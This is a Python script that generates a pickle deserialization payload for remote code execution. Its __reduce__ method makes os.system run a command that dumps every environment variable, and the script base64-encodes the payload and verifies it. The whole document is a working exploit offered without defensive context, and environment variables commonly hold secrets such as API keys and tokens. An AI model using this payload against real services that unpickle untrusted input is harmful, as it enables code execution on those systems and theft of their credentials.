import base64
import pickle
import os

# Let's create a proper pickle payload for RCE
class RCE:
    def __reduce__(self):
        import os
        cmd = "python -c \"import os; print('===ENV_VARS_START==='); [print(f'{k}={v}') for k,v in os.environ.items()]; print('===ENV_VARS_END===')\"
        return (os.system, (cmd,))

# Generate the payload
payload_raw = pickle.dumps(RCE(), protocol=4)
payload_b64 = base64.b64encode(payload_raw).decode('utf-8')

print("[*] Generated new pickle payload")
print(f"[+] Base64: {payload_b64}")
print(f"[+] Length: {len(payload_b64)}")
print(f"[+] Raw bytes length: {len(payload_raw)}")

# Let's also see what the payload looks like in hex
print(f"\n[*] Hex representation of first 100 bytes:")
hex_str = payload_raw[:100].hex()
print(' '.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2)))

# Let's also decode it to see the structure
print(f"\n[*] Manual decode (latin-1) of first 200 chars:")
print(payload_raw[:200].decode('latin-1', errors='ignore'))

# Check if the command is intact
if b'===ENV_VARS_START===' in payload_raw and b'===ENV_VARS_END===' in payload_raw:
    print("\n[+] Command markers found in payload - looks good!")
else:
    print("\n[-] Command markers NOT found - something is wrong!")
